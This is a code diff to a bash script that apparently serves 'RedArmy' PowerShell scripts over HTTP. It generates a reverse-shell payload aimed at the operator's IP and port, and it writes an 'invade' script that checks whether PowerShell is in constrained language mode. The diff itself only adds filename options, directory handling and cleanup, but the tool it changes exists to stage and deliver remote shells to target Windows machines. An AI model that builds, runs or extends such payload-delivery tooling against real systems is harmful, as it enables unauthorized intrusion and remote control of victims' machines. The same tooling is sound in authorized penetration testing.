@@ -31,6 +31,7 @@ cleanup() {
 
     # Cleanup
     rm -rf "$invade_ps1" "$rshell_ps1"
+    find . -ipath "./[^.]*" -type d -empty -delete
 }
 
 deploy() {
@@ -161,10 +162,14 @@ Spin up a simple HTTP server to host the RedArmy scripts.
 
 Options:
     -h, --help         Display this help message
+    --invade=FILE      Use the specified invade filename instead of
+                       invade.ps1
     --no-color         Disable colorized output
     -p, --port=NUM     Use the specified port (default: 8080)
     -r, --rport=NUM    Use the specified port for reverse shell
                        (default: 4444)
+    --rshell=FILE      Use the specified rshell filename instead of
+                       rshell.ps1
     -u, --update       Update git submodules
 
 EOF
@@ -189,9 +194,11 @@ while [[ $# -gt 0 ]]; do
     case "$1" in
         "--") shift && args+=("$@") && break ;;
         "-h"|"--help") help="true" ;;
+        "--invade"*) invade_ps1="$(long_opt "$@")" || shift ;;
         "--no-color") unset color ;;
         "-p"|"--port"*) port="$(long_opt "$@")" || shift ;;
         "-r"|"--rport"*) rport="$(long_opt "$@")" || shift ;;
+        "--rshell"*) rshell_ps1="$(long_opt "$@")" || shift ;;
         "-u"|"--update"*) update="true" ;;
         *) args+=("$1") ;;
     esac
@@ -202,6 +209,9 @@ done
 # Check for valid params
 [[ -z $help ]] || usage 0
 [[ $# -eq 1 ]] || usage 1
+
+# Make sure in serve directory
+cd "$(dirname "$0")" || errx 2 "You're doing something horribly wrong"
 
 ip="$1"
 url="http://$ip:$port"
@@ -226,9 +236,11 @@ trap cleanup SIGINT
 
 # Create reverse shell powershell script
 chmod +x scripts/reverse_powershell # Ensure executable
+mkdir -p "$(dirname "$rshell_ps1")"
 ./scripts/reverse_powershell -p "$rport" "$ip" >"$rshell_ps1"
 
 # Setup invade script
+mkdir -p "$(dirname "$invade_ps1")"
 cat >"$invade_ps1" <<EOF
 if (($languagemode -match "constrained")) {
     echo "Constrained shell detected, retreating"
